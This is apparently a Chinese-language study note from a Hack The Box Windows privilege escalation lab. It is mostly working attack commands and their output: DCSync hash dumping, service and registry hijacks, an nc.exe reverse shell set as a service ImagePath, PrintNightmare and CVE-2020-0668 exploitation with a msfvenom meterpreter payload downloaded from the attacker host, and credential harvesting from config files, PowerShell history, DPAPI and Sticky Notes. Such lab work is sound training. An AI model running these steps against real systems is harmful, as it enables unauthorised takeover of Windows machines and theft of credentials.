<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ crackmapexec smb 10.129.29.67 -u server_adm -p 'HTB_@cademy_stdnt!'

SMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)</code></pre>
<ol><li>从域控制器获取 NTLM 密码哈希值</li></ol>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ impacket-secretsdump server_adm@10.129.29.67 -just-dc-user administrator

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
Administrator:aes128-cts-hmac-sha1-96:94c300d0e47775b407f2496a5cca1a0a
Administrator:des-cbc-md5:d60dfbbf20548938
[*] Cleaning up...</code></pre>
<h2>攻击操操作系统</h2>
<h3>用户账户控制 UAC</h3>
<ol><li><strong>UAC（用户账户控制）</strong>是 Windows 的一项安全机制，用来：</li></ol>
<p>关键特点：</p>
<p>但需要注意：</p>
<ul><li>在程序需要 <strong>管理员权限</strong> 时弹出确认提示</li><li>防止系统被 <strong>未经授权的程序修改</strong></li><li>默认情况下，程序都以 <strong>普通用户权限（Standard User）</strong> 运行</li><li>只有管理员 <strong>明确允许</strong> 时才会提升为管理员权限</li><li>主要目的是 <strong>减少误操作和恶意软件影响</strong></li></ul>
<blockquote>不是严格的安全边界（not a security boundary），只是一个防护层。</blockquote>
<blockquote>攻击者如果已经在系统里，仍然可能通过 <strong>UAC Bypass</strong> 提权。</blockquote>
<h3>弱权限配置</h3>
<p>系统的权限设置复杂且具有挑战性。一个地方的轻微修改可能会在其他地方出现缺陷。作为渗透测试人员，我们需要了解 Windows 中的权限工作原理，以及错误配置如何被利用来提升权限。本节讨论的权限相关缺陷在大型厂商发布的软件应用中相对较少见（但偶尔会出现），而在较小厂商的第三方软件、开源软件和定制应用中则很常见。服务通常以系统权限安装，因此利用服务权限相关的缺陷往往能实现对目标系统的完全控制。无论环境如何，我们都应始终检查权限薄弱，并且既能借助工具，也能手动作，以防工具不方便使用。</p>
<p><strong>这里介绍了四类提权</strong></p>
<ol><li>文件可写 -&gt; 替换服务exe</li><li>服务可控 -&gt; 改<code>binpath</code></li><li>路径未加引号 -&gt; 抢跑执行恶意exe</li><li>注册表可写 -&gt; 改<code>ImagePath</code>或自启动项</li></ol>
<p>****</p>
<ol><li>Permissive File System ACLs（可写服务文件）</li></ol>
<p><strong>概念</strong>: 如果某个 <strong>以 SYSTEM 权限运行的服务程序文件对普通用户可写</strong>，攻击者就可以替换该可执行文件，让系统在启动服务时执行恶意程序，从而获得高权限。</p>
<p><strong>利用步骤</strong></p>
<p><strong>① 枚举存在弱 ACL 的服务文件</strong>: 自动扫描系统中 <strong>服务二进制文件权限配置错误</strong>。</p>
<pre><code>SharpUp.exe audit</code></pre>
<p><strong>② 检查文件 ACL</strong> ：  确认 <code>Users</code> 或 <code>Everyone</code> 是否拥有 <strong>写权限 / Full Control</strong>。</p>
<pre><code>icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"</code></pre>
<p><strong>③ 生成恶意程序</strong> 例如生成反弹 shell：</p>
<pre><code>msfvenom -p windows/shell_reverse_tcp -f exe &gt; SecurityService.exe</code></pre>
<p><strong>④ 替换服务二进制文件</strong></p>
<pre><code>copy SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"</code></pre>
<p><strong>⑤ 启动服务</strong></p>
<pre><code>sc start SecurityService</code></pre>
<p>作用： 服务以 <strong>SYSTEM 权限</strong>运行，从而执行恶意程序并获取高权限。</p>
<hr/>
<ol><li>Weak Service Permissions（弱服务权限）</li></ol>
<p><strong>概念</strong>: 如果普通用户对某个 Windows 服务拥有 <strong>SERVICE_ALL_ACCESS 权限</strong>，攻击者就可以修改服务配置（例如 <code>binpath</code>），让服务在启动时执行攻击者指定的命令，从而获得管理员权限。</p>
<p><strong>利用步骤</strong></p>
<p><strong>① 枚举可修改的服务</strong>: 自动扫描系统中 <strong>权限配置错误的服务对象</strong>。</p>
<pre><code>SharpUp.exe audit</code></pre>
<p><strong>② 检查服务权限</strong>：确认当前用户是否拥有 <strong>SERVICE_ALL_ACCESS</strong>。</p>
<pre><code>accesschk.exe /accepteula -quvcw WindscribeService</code></pre>
<p><strong>③ 修改服务执行路径</strong>：将服务执行路径替换为恶意命令。</p>
<pre><code>sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"</code></pre>
<p><strong>④ 停止服务</strong>：确保服务重新启动时加载新的配置。</p>
<pre><code>sc stop WindscribeService</code></pre>
<p><strong>⑤ 启动服务</strong> ：  系统在尝试启动服务时会执行 <code>binpath</code> 中的命令，从而把当前用户加入 <strong>Administrators 组</strong>。</p>
<pre><code>sc start WindscribeService</code></pre>
<p>****</p>
<ol><li>Unquoted Service Path（未加引号的服务路径）</li></ol>
<p><strong>概念</strong>: 如果服务路径中包含空格但没有使用引号包裹，Windows 在解析路径时会尝试多个可能的执行路径，攻击者可以在这些路径中放置恶意程序，从而劫持服务执行。</p>
<p><strong>利用步骤</strong></p>
<p><strong>① 枚举未加引号的服务路径</strong>: 查找自动启动且路径未被引号包裹的服务。</p>
<pre><code class="language-cmd">wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """</code></pre>
<p><strong>② 查看服务配置</strong>：确认服务路径以及运行权限。</p>
<pre><code class="language-cmd">sc qc SystemExplorerHelpService</code></pre>
<p><strong>③ 在可利用路径放置恶意程序</strong>：例如创建恶意程序：</p>
<pre><code class="language-cmd">C:\Program.exe</code></pre>
<p><strong>④ 等待服务启动</strong>：可以通过服务重启或系统重启触发。</p>
<p>作用： Windows 会优先执行攻击者放置的恶意程序，从而以 <strong>SYSTEM 权限执行代码</strong>。</p>
<hr/>
<ol><li>Permissive Registry ACLs（可写服务注册表）</li></ol>
<p><strong>概念</strong>: 如果普通用户对服务相关的 <strong>注册表键拥有写权限</strong>，攻击者可以修改服务的 <code>ImagePath</code>，让服务在启动时执行恶意程序。</p>
<p><strong>利用步骤</strong></p>
<p><strong>① 枚举服务注册表权限</strong>：查找拥有写权限的服务注册表项。</p>
<p>accesschk.exe /accepteula "username" -kvuqsw hklm\System\CurrentControlSet\services</p>
<p><strong>② 修改服务执行路径</strong>：将 <code>ImagePath</code> 修改为攻击者控制的程序。</p>
<pre><code class="language-PowerShell">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name ImagePath -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"</code></pre>
<p><strong>③ 启动服务</strong></p>
<pre><code class="language-cmd">sc start ModelManagerService</code></pre>
<p>作用： 服务启动时会执行新的 <code>ImagePath</code>，从而以 <strong>SYSTEM 权限运行攻击代码</strong>。</p>
<hr/>
<ol><li>Modifiable Registry Autorun Binary（可修改启动项程序）</li></ol>
<p><strong>概念</strong>: Windows 在系统启动或用户登录时会自动执行某些程序，如果攻击者可以修改这些启动项对应的程序或路径，就可以在用户登录时执行恶意代码实现提权。</p>
<p><strong>利用步骤</strong></p>
<p><strong>① 枚举系统启动项</strong>: 查看系统和用户登录时自动运行的程序。</p>
<pre><code class="language-PowerShell">Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl</code></pre>
<p><strong>② 检查启动程序权限</strong>：确认是否可以修改或替换该程序。</p>
<pre><code>icacls &lt;startup program path&gt;</code></pre>
<p>③ 替换启动程序：用攻击者控制的程序替换原文件。</p>
<p>④ 等待用户登录或系统启动</p>
<p>作用： 当对应用户登录或系统启动时，Windows 会自动执行恶意程序，从而获得更高权限。</p>
<h2>内核漏洞利用</h2>
<p>在这台 <strong>HTB Windows 提权实验机</strong> 上，按本节的 <strong>3 个示例</strong> 各跑一遍，把权限提到 <strong><code>NT AUTHORITY\SYSTEM</code></strong>，最后读取 <strong>Administrator Desktop</strong> 上的 flag。</p>
<p>这 3 个示例分别是：</p>
<ol><li><strong>HiveNightmare / SeriousSam</strong></li></ol>
<ul><li>低权限用户读取shadow副本里的 <code>SAM / SYSTEM / SECURITY</code></li><li>离线提取本地账户哈希</li><li>再利用哈希拿高权限</li></ul>
<ol><li><strong>PrintNightmare</strong></li></ol>
<ul><li>利用打印后台处理服务漏洞</li><li>直接添加一个本地管理员用户，或者执行恶意 DLL</li><li>再切到高权限上下文</li></ul>
<ol><li><strong>CVE-2020-0668 + Mozilla Maintenance Service</strong></li></ol>
<ul><li>利用任意文件移动漏洞，把你可控的恶意程序放进 SYSTEM 服务路径</li><li>启动服务拿 SYSTEM shell</li></ul>
<h3>一、PrintNightmare</h3>
<h4>先检查 Spooler 打印后台服务是否开启</h4>
<p>在目标机 PowerShell：</p>
<pre><code>ls \\localhost\pipe\spoolss</code></pre>
<p>如果看到 <code>spoolss</code>，说明打印服务在跑，可以继续。</p>
<hr/>
<h4>绕过执行策略</h4>
<pre><code class="language-PowerShell">Set-ExecutionPolicy Bypass -Scope Process</code></pre>
<p>输入 <code>A</code> 确认。</p>
<hr/>
<h4>导入脚本并添加管理员用户</h4>
<p>假设题目环境里已经给了 <code>CVE-2021-1675.ps1</code>，执行：</p>
<pre><code class="language-PowerShell">Import-Module C:\Tools\CVE-2021-1675.ps1 Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"</code></pre>
<p>成功时一般会看到类似：</p>
<ul><li>created payload</li></ul>
<ul><li>added user hacker as local administrator</li></ul>
<hr/>
<h4>验证新用户</h4>
<pre><code class="language-cmd">net user hacker</code></pre>
<p>或者：</p>
<pre><code class="language-cmd">net localgroup administrators</code></pre>
<hr/>
<h4>使用新用户获取管理员 Shell</h4>
<p>如果 RDP 允许，直接重新登录：</p>
<ul><li>用户：<code>hacker</code></li></ul>
<ul><li>密码：<code>Pwnd1234!</code></li></ul>
<p>或者在当前会话里尝试：</p>
<pre><code class="language-cmd">runas /user:hacker cmd</code></pre>
<p>然后输入密码。</p>
<hr/>
<h4>再提升到高完整性 Shell</h4>
<p>如果只是管理员组但还是中完整性，执行：</p>
<pre><code class="language-PowerShell">Start-Process cmd -Verb RunAs</code></pre>
<p>弹 UAC 就点是。</p>
<hr/>
<h4>读取 flag</h4>
<pre><code class="language-cmd">type C:\Users\Administrator\Desktop\flag.txt</code></pre>
<p>如果文件名不是这个，先：</p>
<pre><code class="language-cmd">dir C:\Users\Administrator\Desktop</code></pre>
<hr/>
<h3>二、HiveNightmare / SeriousSam</h3>
<p>这个示例的本质是： <strong>低权限读取注册表影子副本 -&gt; 导出 hive -&gt; 离线提 hash</strong>。</p>
<hr/>
<h4>检查 SAM 文件权限</h4>
<pre><code class="language-cmd">icacls C:\Windows\System32\config\SAM</code></pre>
<p>你要看有没有类似：</p>
<pre><code>BUILTIN\Users:(I)(RX)</code></pre>
<p>如果有，说明有戏。</p>
<hr/>
<h4>运行 HiveNightmare</h4>
<p>假设工具已经在桌面或工具目录：</p>
<pre><code class="language-cmd">.\HiveNightmare.exe</code></pre>
<p>正常会吐出：</p>
<ul><li><code>SAM-xxxx-xx-xx</code></li></ul>
<ul><li><code>SYSTEM-xxxx-xx-xx</code></li></ul>
<ul><li><code>SECURITY-xxxx-xx-xx</code></li></ul>
<hr/>
<h4>把文件传回攻击机</h4>
<p>在攻击机开 HTTP 或 SMB 收，或者直接 RDP 拖出来。 如果你在 Kali 上，用 impacket 解析：</p>
<pre><code class="language-shell">impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local</code></pre>
<hr/>
<h4>拿到哈希后怎么用</h4>
<p>如果看到管理员或其他高权限账户哈希，可以尝试：</p>
<ul><li>本地 PTH（某些场景）</li></ul>
<ul><li>SMB / WinRM / PsExec</li></ul>
<ul><li>或者用明文密码复用</li></ul>
<p>但这一步在这题里不一定是最顺的路线。 所以这部分你更该把它当作：</p>
<p><strong>“验证这个漏洞能被利用”</strong>。</p>
<p>如果题目硬要求 “try out 3 examples”，你跑通导出 hive 并拿到 hash，基本就算完成这个示例了。</p>
<hr/>
<h3>三、CVE-2020-0668 与 Mozilla Maintenance Service 提权链</h3>
<p>这个是本节里最像“标准 SYSTEM 提权”的链子。</p>
<h4>先确认当前权限不高</h4>
<pre><code class="language-cmd">whoami /priv</code></pre>
<p>一般会看到你只是普通用户权限。</p>
<hr/>
<h4>检查 Mozilla Maintenance Service 二进制文件权限</h4>
<pre><code class="language-cmd">icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
<p>正常一开始你应该只有：</p>
<pre><code>BUILTIN\Users:(I)(RX)</code></pre>
<p>也就是只能读执行，不能写。</p>
<hr/>
<h4>在攻击机生成恶意 EXE</h4>
<p>如果你用 msfvenom：</p>
<pre><code class="language-shell">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=&lt;你的VPN_IP&gt; LPORT=8443 -f exe &gt; maintenanceservice.exe</code></pre>
<hr/>
<h4>在攻击机开启 HTTP 服务</h4>
<pre><code class="language-shell">python3 -m http.server 8080</code></pre>
<hr/>
<h4>在目标机下载两份恶意 EXE</h4>
<p>PowerShell：</p>
<pre><code class="language-PowerShell">wget http://&lt;你的VPN_IP&gt;:8080/maintenanceservice.exe -O C:\Users\htb-student\Desktop\maintenanceservice.exe
wget http://&lt;你的VPN_IP&gt;:8080/maintenanceservice.exe -O C:\Users\htb-student\Desktop\maintenanceservice2.exe</code></pre>
<p>为什么两份？ 因为第一份在漏洞利用过程中会被“搞坏”，第二份是备用的干净版本。</p>
<hr/>
<h4>运行 CVE-2020-0668</h4>
<p>假设 exploit 在 <code>C:\Tools\CVE-2020-0668\</code>：</p>
<pre><code class="language-cmd">C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
<p>如果输出里有：</p>
<ul><li><code>Moving ...</code></li></ul>
<ul><li><code>Creating symbol links</code></li></ul>
<ul><li><code>Updating ... Tracing ...</code></li></ul>
<ul><li><code>Done!</code></li></ul>
<p>说明大体跑通了。</p>
<hr/>
<h4>再检查目标文件权限</h4>
<pre><code class="language-cmd">icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
<p>这时你应该看到自己用户对它有：</p>
<pre><code>(F)</code></pre>
<p>也就是 Full Control。</p>
<hr/>
<h4>用第二份干净恶意 EXE 覆盖目标服务文件</h4>
<p>注意这步要在 <strong>cmd.exe</strong> 里执行，不是 PowerShell。</p>
<pre><code class="language-cmd">copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
<hr/>
<h4>在攻击机启动 Metasploit handler</h4>
<p>先写一个 <code>handler.rc</code>：</p>
<pre><code>use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST &lt;你的VPN_IP&gt;
set LPORT 8443
exploit</code></pre>
<p>启动：</p>
<pre><code class="language-shell">sudo msfconsole -r handler.rc</code></pre>
<hr/>
<h4>启动 Mozilla Maintenance 服务</h4>
<p>目标机执行：</p>
<pre><code class="language-cmd">net start MozillaMaintenance</code></pre>
<p>即使报错：</p>
<pre><code>The service is not responding to the control function</code></pre>
<p>也别慌，这种错误在这类题里经常只是“服务没正常起来，但 payload 已经执行了”。</p>
<hr/>
<h4>在 msfconsole 中获取 SYSTEM 会话</h4>
<p>成功后通常会弹回：</p>
<pre><code>Meterpreter session opened ...</code></pre>
<p>进去确认：</p>
<pre><code>getuid</code></pre>
<p>你想看到的是：</p>
<pre><code>NT AUTHORITY\SYSTEM</code></pre>
<hr/>
<h4>最后读取 flag</h4>
<p>如果你在 meterpreter 里：</p>
<pre><code>shell
type C:\Users\Administrator\Desktop\flag.txt</code></pre>
<p>如果文件名不对：</p>
<pre><code class="language-cmd">dir C:\Users\Administrator\Desktop</code></pre>
<h2>凭据窃取</h2>
<h3>搜索</h3>
<p>违背最佳实践，应用程序通常将密码存储在明文配置文件中。假设我们在一个无权限用户账户的上下文中获得命令执行。在这种情况下，我们可能能找到他们管理员账户或其他特权本地或域账户的凭证。我们可以使用 <a href="https://ss64.com/nt/findstr.html" rel="noreferrer" target="_blank">findstr</a> 工具来搜索这些敏感信息。</p>
<ol><li><strong>应用配置文件</strong></li></ol>
<pre><code>PS C:\htb&gt; findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml</code></pre>
<p>敏感的 IIS 信息，如凭证，可能会存储在 <code>web.config</code> 文件中。对于默认的 IIS 网站，这个地址可能在 <code>C：\inetpub\wwwroot\web.config</code>，但该文件可能在不同位置有多个版本，我们可以递归地搜索。</p>
<ol><li><strong>词典文件</strong></li></ol>
<p>另一个有趣的例子是词典文件。例如，密码等敏感信息可能会在电子邮件客户端或基于浏览器的应用中输入，这些应用会在不识别的单词下划线。用户可以将这些词汇添加到词典中，以避免红色下划线分散注意力。</p>
<pre><code class="language-PowerShell">PS C:\htb&gt; gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password 

Password1234!</code></pre>
<p>可能定义了自动登录设置或安装过程中需要创建的额外账户。<code>unattend.xml</code> 中的密码以明文或 base64 编码存储。</p>
<ol><li><strong>Unattended 安装文件</strong></li></ol>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;unattend xmlns="urn:schemas-microsoft-com:unattend"&gt;
    &lt;settings pass="specialize"&gt;
        &lt;component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
            &lt;AutoLogon&gt;
                &lt;Password&gt;
                    &lt;Value&gt;local_4dmin_p@ss&lt;/Value&gt;
                    &lt;PlainText&gt;true&lt;/PlainText&gt;
                &lt;/Password&gt;
                &lt;Enabled&gt;true&lt;/Enabled&gt;
                &lt;LogonCount&gt;2&lt;/LogonCount&gt;
                &lt;Username&gt;Administrator&lt;/Username&gt;
            &lt;/AutoLogon&gt;
            &lt;ComputerName&gt;*&lt;/ComputerName&gt;
        &lt;/component&gt;
    &lt;/settings&gt;</code></pre>
<p>虽然这些文件应作为安装的一部分自动删除，但系统管理员在制作映像和答复文件时，可能在其他文件夹中创建了该文件的副本。</p>
<p>从 Windows 10 的 PowerShell 5.0 开始，PowerShell 将命令历史记录存储在以下文件中：</p>
<ol><li><strong>PowerShell 历史文件</strong></li></ol>
<ul><li><code>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code>.</li></ul>
<p>正如 Microsoft 发布的（handy）Windows Commands PDF 中所见，有许多命令可以在命令行传递凭证。在下面的示例中可以看到，用户指定本地管理凭证用 <a href="https://ss64.com/nt/wevtutil.html" rel="noreferrer" target="_blank">wevutil</a> 查询应用事件日志。</p>
<ul><li>确认 PowerShell 历史保存路径</li></ul>
<pre><code>PS C:\htb&gt; (Get-PSReadLineOption).HistorySavePath

C:\Users\htb-student\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></pre>
<p>一旦知道了文件的位置（默认路径在上面），我们就可以尝试用 <code>gc</code> 读取其内容。</p>
<ul><li>阅读 PowerShell 历史文件</li></ul>
<pre><code class="language-PowerShell">PS C:\htb&gt; gc (Get-PSReadLineOption).HistorySavePath 
dir 
cd Temp 
md backups 
cp c:\inetpub\wwwroot\* .\backups\ 
Set-ExecutionPolicy Bypass -Scope Process -Force; 
[System.Net.ServicePointManager]::SecurityProtocol = 
[System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://www.PowerShellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1')) 
. .\Get-IISsite.ps1 Get-IISsite -Server WEB02 -web "Default Web Site" 
wevtutil qe Application "/q:*[Application [(EventID=3005)]]" /f:text /rd:true 
/u:WEB02\administrator /p:5erv3rAdmin! /r:WEB02</code></pre>
<p>我们还可以用这句一句话来检索当前用户能访问的所有 PowerShell 历史文件的内容。这在exploit 后也非常有帮助。如果我们之前的访问权限无法读取某些用户的文件，我们应该在获得本地管理员后重新检查这些文件。该命令假设使用的是默认的存档路径。</p>
<pre><code>PS C:\htb&gt;foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}

dir
cd Temp
md backups
cp c:\inetpub\wwwroot\* .\backups\
Set-ExecutionPolicy Bypass -Scope Process -Force;
[System.Net.ServicePointManager]::SecurityProtocol = 
[System.Net.ServicePointManager]::SecurityProtocol -bor 3072;
iex ((New-Object System.Net.WebClient).DownloadString('https://www.PowerShellgallery.com/packages/MrAToolbox/IISSite.ps1'))

.\Get-IISSite.ps1
Get-IISsite -Server WEB02 -web "Default Web Site"

wevtutil qe Application "/q:*[Application [(EventID=3005)]]" /f:text /rd:true /u:WEB02\administrator /p:5erv3rAdmin! /r:WEB02</code></pre>
<p>凭据常被用于脚本编写和自动化任务，方便地存储加密凭据。凭据通过 <a href="https://en.wikipedia.org/wiki/Data_Protection_API" rel="noreferrer" target="_blank">DPAPI</a> 保护，通常意味着只有同一用户在创建它们的同一计算机上才能解密。</p>
<ol><li><strong>PowerShell 凭证</strong></li></ol>
<p>举个例子，以下脚本 <code>Connect-VC.ps1</code>，一位系统管理员创建它，方便连接到 vCenter 服务器。</p>
<pre><code># Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword</code></pre>
<p>解密 PowerShell 凭据 如果我们在该用户的背景中获得了命令执行权，或者能滥用 DPAPI，那么我们可以从 <code>encrypted.xml</code> 恢复明文凭据。下面的例子假设是前者。</p>
<pre><code>PS C:\htb&gt; $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\htb&gt; $credential.GetNetworkCredential().username

bob


PS C:\htb&gt; $credential.GetNetworkCredential().password

Str0ng3ncryptedP@ss!</code></pre>
<h3>其他文件</h3>
<p>还有许多其他类型的文件，我们可以在本地系统或网络共享驱动器上找到，这些文件可能包含凭证或可用于权限提升的信息。在 Active Directory 环境中，我们可以使用类似 Snaffler 的工具来扫描网络共享，寻找有趣的文件扩展名，例如 .kdbx、.vmdk、.vdhx、.ppk 等。我们可能会找到可以挂载并提取本地管理员密码哈希的虚拟硬盘，或可用于访问其他系统的 SSH 私钥，或者用户将密码存储在 Excel/Word 文档、OneNote 或经典的 passwords.txt 文件中。在很多渗透测试中，一个在共享盘或本地盘中找到的密码就足以实现初始访问或权限提升。很多公司会给每个员工分配一个共享文件夹（例如 FILE01 上的用户目录 bjones），并设置较宽松的权限（例如所有域用户都可读）。用户往往会在这些文件夹中存储敏感信息，而不知道这些数据对整个网络都是可见的。</p>
<p><strong>手动在文件系统中搜索凭证</strong></p>
<p>我们可以使用以下命令手动搜索文件系统或共享驱动器中的内容。</p>
<pre><code>C:\htb&gt; cd c:\Users\htb-student\Documents &amp; findstr /SI /M "password" *.xml *.ini *.txt

stuff.txt
</code></pre>
<p>示例 2：</p>
<pre><code>C:\htb&gt; findstr /si password *.xml *.ini *.txt *.config

stuff.txt:password: l#-x9r11_2_GL!</code></pre>
<p>示例 3：</p>
<pre><code>C:\htb&gt; findstr /spin "password" _._
 
stuff.txt:1:password: l#-x9r11_2_GL!</code></pre>
<p><strong>使用 PowerShell 搜索文件内容</strong> 我们也可以用 PowerShell 以多种方式进行搜索，下面是一个示例：</p>
<pre><code>PS C:\htb&gt; select-string -Path C:\Users\htb-student\Documents*.txt -Pattern password

stuff.txt:1:password: l#-x9r11_2_GL!</code></pre>
<p>搜索特定文件扩展名 - 示例 1：</p>
<pre><code>C:\htb&gt; dir /S /B _pass_.txt == _pass_.xml == _pass_.ini == _cred_ == _vnc_ == _.config_

c:\inetpub\wwwroot\web.config</code></pre>
<p>搜索特定文件扩展名 - 示例 2：</p>
<pre><code>C:\htb&gt; where /R C:\ *.config

c:\inetpub\wwwroot\web.config</code></pre>
<p>同样，我们也可以使用如下命令搜索特定扩展名的文件：</p>
<pre><code>PS C:\htb&gt; Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore</code></pre>
<p><strong>便签（Sticky Notes）中的密码</strong></p>
<p>人们经常使用 Windows 的 StickyNotes 应用来保存密码和其他信息，却不知道它实际上是一个数据库文件。该文件位于：</p>
<pre><code>PS C:\htb&gt; Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore


    Directory: C:\inetpub\wwwroot


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/25/2021   9:59 AM            329 web.config

&lt;SNIP&gt;




    Directory: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ASP.NETWebAdminFiles


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         12/7/2019   1:12 AM           1040 web.config
</code></pre>
<p><strong>查找 StickyNotes 数据库文件：</strong> 人们经常在 Windows 工作站上使用 StickyNotes 应用来保存密码和其他信息，却没意识到它是一个数据库文件。这个文件位于， <code>C:\Users\&lt;user&gt;\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite</code> 值得搜索和检查。</p>
<ul><li>寻找便签数据库文件</li></ul>
<pre><code>PS C:\htb&gt; ls
 
 
    Directory: C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
 
 
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/25/2021  11:59 AM          20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
-a----         5/25/2021  11:59 AM            982 Ecs.dat
-a----         5/25/2021  11:59 AM           4096 plum.sqlite
-a----         5/25/2021  11:59 AM          32768 plum.sqlite-shm
-a----         5/25/2021  12:00 PM         197792 plum.sqlite-wal</code></pre>
<p>我们可以把三个 <code>plum.sqlite*</code> 文件复制到系统，用 DB 浏览器等 SQLite 工具打开，通过查询<code>select Text from Note;</code> 查看 Note 表中的 <code>Text</code> 列。</p>
<img alt="Pasted image 20260322052414" src="assets/posts/windows-privilege-escalation/Pasted image 20260322052414.png"/>
<p><strong>使用 PowerShell 查看便签数据</strong> 这也可以用 PowerShell 的 PSSQLite 模块完成。首先，导入模块，指向一个数据源（这里指 StickNotes 应用使用的 SQLite 数据库文件），最后查询 <code>Note</code> 表，寻找任何有趣的数据。这也可以在我们的攻击机器上下载 <code>.sqlite</code> 文件后完成，或者远程通过 WinRM 完成。</p>
<pre><code class="language-PowerShell">PS C:\htb&gt; Set-ExecutionPolicy Bypass -Scope Process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A

PS C:\htb&gt; cd .\PSSQLite\
PS C:\htb&gt; Import-Module .\PSSQLite.psd1
PS C:\htb&gt; $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
PS C:\htb&gt; Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
 
Text
----
\id=de368df0-6939-4579-8d38-0fda521c9bc4 vCenter
\id=e4adae4c-a40b-48b4-93a5-900247852f96
\id=1a44a631-6fff-4961-a4df-27898e9e1e65 root:Vc3nt3R_adm1n!
\id=c450fc5f-dc51-4412-b4ac-321fd41c522a Thycotic demo tomorrow at 10am</code></pre>
<p><strong>用于查看数据库文件内容的字符串</strong> 我们也可以把它们复制到攻击框，用<code>字符串</code>命令搜索数据，这取决于数据库大小，效率可能较低。</p>
<pre><code class="language-PowerShell">Chenduoduo@htb[/htb]$  strings plum.sqlite-wal

CREATE TABLE "Note" (
"Text" varchar ,
"WindowPosition" varchar ,
"IsOpen" integer ,
"IsAlwaysOnTop" integer ,
"CreationNoteIdAnchor" varchar ,
"Theme" varchar ,
"IsFutureNote" integer ,
"RemoteId" varchar ,
"ChangeKey" varchar ,
"LastServerVersion" varchar ,
"RemoteSchemaVersion" integer ,
"IsRemoteDataInvalid" integer ,
"PendingInsightsScan" integer ,
"Type" varchar ,
"Id" varchar primary key not null ,
"ParentId" varchar ,
"CreatedAt" bigint ,
"DeletedAt" bigint ,
"UpdatedAt" bigint )'
indexsqlite_autoindex_Note_1Note
af907b1b-1eef-4d29-b238-3ea74f7ffe5caf907b1b-1eef-4d29-b238-3ea74f7ffe5c
